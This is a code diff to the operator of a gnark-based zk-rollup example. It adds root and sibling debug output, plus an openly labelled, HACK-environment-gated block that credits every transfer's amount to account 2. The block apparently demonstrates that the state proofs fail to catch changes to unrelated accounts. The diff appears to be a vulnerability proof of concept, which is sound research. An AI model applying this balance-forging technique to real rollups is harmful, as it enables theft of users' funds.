@@ -18,8 +18,11 @@ package rollup
 
 import (
 	"bytes"
+	"encoding/hex"
+	"fmt"
 	"hash"
 	"math/big"
+	"os"
 
 	"github.com/consensys/gnark-crypto/accumulator/merkletree"
 	"github.com/consensys/gnark-crypto/ecc/bn254/fr/mimc"
@@ -128,6 +131,15 @@ func (o *Operator) updateState(t Transfer, numTransfer int) error {
 		return ErrIndexConsistency
 	}
 
+	posHacked := uint64(2)
+	hackedAccount, err := o.readAccount(posHacked)
+	if err != nil {
+		return err
+	}
+	if hackedAccount.index != posHacked {
+		return ErrIndexConsistency
+	}
+
 	// set witnesses for the leaves
 	o.witnesses.LeafReceiver[numTransfer] = posReceiver
 	o.witnesses.LeafSender[numTransfer] = posSender
@@ -157,7 +169,10 @@ func (o *Operator) updateState(t Transfer, numTransfer int) error {
 	if err != nil {
 		return err
 	}
-
+	fmt.Println("root before:", hex.EncodeToString(merkleRootBefore))
+	for i := range proofInclusionSenderBefore {
+		fmt.Println("siblings:", hex.EncodeToString(proofInclusionSenderBefore[i]))
+	}
 	// verify the proof in plain go...
 	merkletree.VerifyProof(o.h, merkleRootBefore, proofInclusionSenderBefore, posSender, numLeaves)
 
@@ -237,6 +252,40 @@ func (o *Operator) updateState(t Transfer, numTransfer int) error {
 	bufReceiver := o.h.Sum([]byte{})
 	copy(o.HashState[int(posReceiver)*o.h.Size():(int(posReceiver)+1)*o.h.Size()], bufReceiver)
 
+	// hack one account
+	if _, b := os.LookupEnv("HACK"); b {
+		{
+			fmt.Println("\nthis is the unhacked merkleproof")
+
+			//  Set witnesses for the proof of inclusion of sender and receivers account after update
+			buf.Reset()
+			_, err = buf.Write(o.HashState)
+			if err != nil {
+				return err
+			}
+			merkleRootAfer, proofInclusionSenderAfter, _, err := merkletree.BuildReaderProof(&buf, o.h, segmentSize, posSender)
+			if err != nil {
+				return err
+			}
+			// merkleProofHelperSenderAfter := merkle.GenerateProofHelper(proofInclusionSenderAfter, posSender, numLeaves)
+
+			fmt.Println("\nroot unhacked: ", hex.EncodeToString(merkleRootAfer))
+			for i := range proofInclusionSenderAfter {
+				fmt.Println("siblings:", hex.EncodeToString(proofInclusionSenderAfter[i]))
+			}
+		}
+		fmt.Println("\nnow hack! adding balance", t.amount.String(), "to account nr 2")
+		// update balance
+		hackedAccount.balance.Add(&hackedAccount.balance, &t.amount)
+
+		// update the state of the operator
+		copy(o.State[int(posHacked)*SizeAccount:], hackedAccount.Serialize())
+		o.h.Reset()
+		_, _ = o.h.Write(hackedAccount.Serialize())
+		bufHacked := o.h.Sum([]byte{})
+		copy(o.HashState[int(posHacked)*o.h.Size():(int(posHacked)+1)*o.h.Size()], bufHacked)
+	}
+
 	//  Set witnesses for the proof of inclusion of sender and receivers account after update
 	buf.Reset()
 	_, err = buf.Write(o.HashState)
@@ -248,6 +297,11 @@ func (o *Operator) updateState(t Transfer, numTransfer int) error {
 		return err
 	}
 	// merkleProofHelperSenderAfter := merkle.GenerateProofHelper(proofInclusionSenderAfter, posSender, numLeaves)
+
+	fmt.Println("\nroot after: ", hex.EncodeToString(merkleRootAfer))
+	for i := range proofInclusionSenderAfter {
+		fmt.Println("siblings:", hex.EncodeToString(proofInclusionSenderAfter[i]))
+	}
 
 	buf.Reset() // the buffer needs to be reset
 	_, err = buf.Write(o.HashState)
